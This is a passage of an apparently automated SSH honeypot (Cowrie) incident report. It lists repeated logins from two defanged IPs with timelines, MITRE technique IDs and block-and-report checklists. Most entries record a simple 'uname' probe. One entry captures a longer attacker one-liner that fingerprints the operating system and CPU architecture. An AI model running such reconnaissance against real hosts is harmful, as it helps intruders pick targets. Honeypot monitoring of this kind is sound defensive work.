| **First Seen** | 2026-07-13 06:38 |
| **Last Seen** | 2026-07-13 06:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:38:40` | `cowrie.session.connect` |
| `2026-07-13 06:38:40` | `cowrie.client.version` |
| `2026-07-13 06:38:40` | `cowrie.client.kex` |
| `2026-07-13 06:38:44` | `cowrie.login.success` |
| `2026-07-13 06:38:45` | `cowrie.session.params` |
| `2026-07-13 06:38:45` | `cowrie.command.input` |
| `2026-07-13 06:38:45` | `cowrie.log.closed` |
| `2026-07-13 06:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7c155da9705

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:38 |
| **Last Seen** | 2026-07-13 06:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:38:49` | `cowrie.session.connect` |
| `2026-07-13 06:38:50` | `cowrie.client.version` |
| `2026-07-13 06:38:50` | `cowrie.client.kex` |
| `2026-07-13 06:38:51` | `cowrie.login.success` |
| `2026-07-13 06:38:52` | `cowrie.session.params` |
| `2026-07-13 06:38:52` | `cowrie.command.input` |
| `2026-07-13 06:38:53` | `cowrie.log.closed` |
| `2026-07-13 06:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecacf2ae7bde

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:38 |
| **Last Seen** | 2026-07-13 06:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:38:58` | `cowrie.session.connect` |
| `2026-07-13 06:38:58` | `cowrie.client.version` |
| `2026-07-13 06:38:58` | `cowrie.client.kex` |
| `2026-07-13 06:39:01` | `cowrie.login.success` |
| `2026-07-13 06:39:03` | `cowrie.session.params` |
| `2026-07-13 06:39:03` | `cowrie.command.input` |
| `2026-07-13 06:39:03` | `cowrie.log.closed` |
| `2026-07-13 06:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-669da59c01e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:39 |
| **Last Seen** | 2026-07-13 06:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:39:07` | `cowrie.session.connect` |
| `2026-07-13 06:39:07` | `cowrie.client.version` |
| `2026-07-13 06:39:07` | `cowrie.client.kex` |
| `2026-07-13 06:39:09` | `cowrie.login.success` |
| `2026-07-13 06:39:10` | `cowrie.session.params` |
| `2026-07-13 06:39:10` | `cowrie.command.input` |
| `2026-07-13 06:39:10` | `cowrie.log.closed` |
| `2026-07-13 06:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f25e46d58b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:39 |
| **Last Seen** | 2026-07-13 06:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:39:14` | `cowrie.session.connect` |
| `2026-07-13 06:39:15` | `cowrie.client.version` |
| `2026-07-13 06:39:15` | `cowrie.client.kex` |
| `2026-07-13 06:39:17` | `cowrie.login.success` |
| `2026-07-13 06:39:19` | `cowrie.session.params` |
| `2026-07-13 06:39:19` | `cowrie.command.input` |
| `2026-07-13 06:39:19` | `cowrie.log.closed` |
| `2026-07-13 06:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52a2eaddad1a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:39 |
| **Last Seen** | 2026-07-13 06:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:39:22` | `cowrie.session.connect` |
| `2026-07-13 06:39:23` | `cowrie.client.version` |
| `2026-07-13 06:39:23` | `cowrie.client.kex` |
| `2026-07-13 06:39:26` | `cowrie.login.success` |
| `2026-07-13 06:39:28` | `cowrie.session.params` |
| `2026-07-13 06:39:28` | `cowrie.command.input` |
| `2026-07-13 06:39:28` | `cowrie.log.closed` |
| `2026-07-13 06:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-954b6abd530b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:39 |
| **Last Seen** | 2026-07-13 06:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:39:31` | `cowrie.session.connect` |
| `2026-07-13 06:39:32` | `cowrie.client.version` |
| `2026-07-13 06:39:32` | `cowrie.client.kex` |
| `2026-07-13 06:39:33` | `cowrie.login.success` |
| `2026-07-13 06:39:34` | `cowrie.session.params` |
| `2026-07-13 06:39:34` | `cowrie.command.input` |
| `2026-07-13 06:39:35` | `cowrie.log.closed` |
| `2026-07-13 06:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4c90c620bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:39 |
| **Last Seen** | 2026-07-13 06:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:39:39` | `cowrie.session.connect` |
| `2026-07-13 06:39:39` | `cowrie.client.version` |
| `2026-07-13 06:39:39` | `cowrie.client.kex` |
| `2026-07-13 06:39:41` | `cowrie.login.success` |
| `2026-07-13 06:39:42` | `cowrie.session.params` |
| `2026-07-13 06:39:42` | `cowrie.command.input` |
| `2026-07-13 06:39:43` | `cowrie.log.closed` |
| `2026-07-13 06:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca729c98abab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:39 |
| **Last Seen** | 2026-07-13 06:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:39:47` | `cowrie.session.connect` |
| `2026-07-13 06:39:48` | `cowrie.client.version` |
| `2026-07-13 06:39:48` | `cowrie.client.kex` |
| `2026-07-13 06:39:50` | `cowrie.login.success` |
| `2026-07-13 06:39:52` | `cowrie.session.params` |
| `2026-07-13 06:39:52` | `cowrie.command.input` |
| `2026-07-13 06:39:52` | `cowrie.log.closed` |
| `2026-07-13 06:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e00e5ba962

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:39 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:39:55` | `cowrie.session.connect` |
| `2026-07-13 06:39:56` | `cowrie.client.version` |
| `2026-07-13 06:39:56` | `cowrie.client.kex` |
| `2026-07-13 06:39:59` | `cowrie.login.success` |
| `2026-07-13 06:40:01` | `cowrie.session.params` |
| `2026-07-13 06:40:01` | `cowrie.command.input` |
| `2026-07-13 06:40:02` | `cowrie.log.closed` |
| `2026-07-13 06:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef56e97755bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:03` | `cowrie.session.connect` |
| `2026-07-13 06:40:04` | `cowrie.client.version` |
| `2026-07-13 06:40:04` | `cowrie.client.kex` |
| `2026-07-13 06:40:06` | `cowrie.login.success` |
| `2026-07-13 06:40:08` | `cowrie.session.params` |
| `2026-07-13 06:40:08` | `cowrie.command.input` |
| `2026-07-13 06:40:08` | `cowrie.log.closed` |
| `2026-07-13 06:40:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16da0476c4ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:13` | `cowrie.session.connect` |
| `2026-07-13 06:40:13` | `cowrie.client.version` |
| `2026-07-13 06:40:13` | `cowrie.client.kex` |
| `2026-07-13 06:40:15` | `cowrie.login.success` |
| `2026-07-13 06:40:16` | `cowrie.session.params` |
| `2026-07-13 06:40:16` | `cowrie.command.input` |
| `2026-07-13 06:40:16` | `cowrie.log.closed` |
| `2026-07-13 06:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8560134df23a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:21` | `cowrie.session.connect` |
| `2026-07-13 06:40:21` | `cowrie.client.version` |
| `2026-07-13 06:40:21` | `cowrie.client.kex` |
| `2026-07-13 06:40:23` | `cowrie.login.success` |
| `2026-07-13 06:40:24` | `cowrie.session.params` |
| `2026-07-13 06:40:24` | `cowrie.command.input` |
| `2026-07-13 06:40:24` | `cowrie.log.closed` |
| `2026-07-13 06:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8f76a2b3a07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:29` | `cowrie.session.connect` |
| `2026-07-13 06:40:29` | `cowrie.client.version` |
| `2026-07-13 06:40:29` | `cowrie.client.kex` |
| `2026-07-13 06:40:31` | `cowrie.login.success` |
| `2026-07-13 06:40:32` | `cowrie.session.params` |
| `2026-07-13 06:40:32` | `cowrie.command.input` |
| `2026-07-13 06:40:33` | `cowrie.log.closed` |
| `2026-07-13 06:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a0779b78bb4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:37` | `cowrie.session.connect` |
| `2026-07-13 06:40:38` | `cowrie.client.version` |
| `2026-07-13 06:40:38` | `cowrie.client.kex` |
| `2026-07-13 06:40:41` | `cowrie.login.success` |
| `2026-07-13 06:40:42` | `cowrie.session.params` |
| `2026-07-13 06:40:42` | `cowrie.command.input` |
| `2026-07-13 06:40:43` | `cowrie.log.closed` |
| `2026-07-13 06:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7413a44d4583

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:46` | `cowrie.session.connect` |
| `2026-07-13 06:40:47` | `cowrie.client.version` |
| `2026-07-13 06:40:47` | `cowrie.client.kex` |
| `2026-07-13 06:40:49` | `cowrie.login.success` |
| `2026-07-13 06:40:51` | `cowrie.session.params` |
| `2026-07-13 06:40:51` | `cowrie.command.input` |
| `2026-07-13 06:40:51` | `cowrie.log.closed` |
| `2026-07-13 06:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97de342f97d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:53` | `cowrie.session.connect` |
| `2026-07-13 06:40:53` | `cowrie.client.version` |
| `2026-07-13 06:40:53` | `cowrie.client.kex` |
| `2026-07-13 06:40:53` | `cowrie.login.success` |
| `2026-07-13 06:40:54` | `cowrie.session.params` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.success` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.command.input` |
| `2026-07-13 06:40:54` | `cowrie.log.closed` |
| `2026-07-13 06:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d990194386a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:40 |
| **Last Seen** | 2026-07-13 06:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:40:55` | `cowrie.session.connect` |
| `2026-07-13 06:40:55` | `cowrie.client.version` |
| `2026-07-13 06:40:55` | `cowrie.client.kex` |
| `2026-07-13 06:40:57` | `cowrie.login.success` |
| `2026-07-13 06:40:59` | `cowrie.session.params` |
| `2026-07-13 06:40:59` | `cowrie.command.input` |
| `2026-07-13 06:40:59` | `cowrie.log.closed` |
| `2026-07-13 06:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e5dda47fcb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:41 |
| **Last Seen** | 2026-07-13 06:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:41:03` | `cowrie.session.connect` |
| `2026-07-13 06:41:03` | `cowrie.client.version` |
| `2026-07-13 06:41:03` | `cowrie.client.kex` |
| `2026-07-13 06:41:06` | `cowrie.login.success` |
| `2026-07-13 06:41:08` | `cowrie.session.params` |
| `2026-07-13 06:41:08` | `cowrie.command.input` |
| `2026-07-13 06:41:09` | `cowrie.log.closed` |
| `2026-07-13 06:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e564849c9112

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:41 |
| **Last Seen** | 2026-07-13 06:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:41:11` | `cowrie.session.connect` |
| `2026-07-13 06:41:12` | `cowrie.client.version` |
| `2026-07-13 06:41:12` | `cowrie.client.kex` |
| `2026-07-13 06:41:15` | `cowrie.login.success` |
| `2026-07-13 06:41:17` | `cowrie.session.params` |
| `2026-07-13 06:41:17` | `cowrie.command.input` |
| `2026-07-13 06:41:17` | `cowrie.log.closed` |
| `2026-07-13 06:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-315995429872

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:41 |
| **Last Seen** | 2026-07-13 06:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:41:21` | `cowrie.session.connect` |
| `2026-07-13 06:41:21` | `cowrie.client.version` |
| `2026-07-13 06:41:21` | `cowrie.client.kex` |
| `2026-07-13 06:41:22` | `cowrie.login.success` |
| `2026-07-13 06:41:23` | `cowrie.session.params` |
| `2026-07-13 06:41:23` | `cowrie.command.input` |
| `2026-07-13 06:41:24` | `cowrie.log.closed` |
| `2026-07-13 06:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24c837ecbafe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:41 |
| **Last Seen** | 2026-07-13 06:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:41:29` | `cowrie.session.connect` |
| `2026-07-13 06:41:29` | `cowrie.client.version` |
| `2026-07-13 06:41:29` | `cowrie.client.kex` |
| `2026-07-13 06:41:30` | `cowrie.login.success` |
| `2026-07-13 06:41:31` | `cowrie.session.params` |
| `2026-07-13 06:41:31` | `cowrie.command.input` |
| `2026-07-13 06:41:32` | `cowrie.log.closed` |
| `2026-07-13 06:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90452ac2fde6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:41 |
| **Last Seen** | 2026-07-13 06:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:41:37` | `cowrie.session.connect` |
| `2026-07-13 06:41:38` | `cowrie.client.version` |
| `2026-07-13 06:41:38` | `cowrie.client.kex` |
| `2026-07-13 06:41:39` | `cowrie.login.success` |
| `2026-07-13 06:41:41` | `cowrie.session.params` |
| `2026-07-13 06:41:41` | `cowrie.command.input` |
| `2026-07-13 06:41:41` | `cowrie.log.closed` |
| `2026-07-13 06:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34582d978288

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:41 |
| **Last Seen** | 2026-07-13 06:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:41:46` | `cowrie.session.connect` |
| `2026-07-13 06:41:46` | `cowrie.client.version` |
| `2026-07-13 06:41:46` | `cowrie.client.kex` |
| `2026-07-13 06:41:47` | `cowrie.login.success` |
| `2026-07-13 06:41:48` | `cowrie.session.params` |
| `2026-07-13 06:41:48` | `cowrie.command.input` |
| `2026-07-13 06:41:49` | `cowrie.log.closed` |
| `2026-07-13 06:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d04144667ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:41 |
| **Last Seen** | 2026-07-13 06:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:41:54` | `cowrie.session.connect` |
| `2026-07-13 06:41:54` | `cowrie.client.version` |
| `2026-07-13 06:41:54` | `cowrie.client.kex` |
| `2026-07-13 06:41:56` | `cowrie.login.success` |
| `2026-07-13 06:41:58` | `cowrie.session.params` |
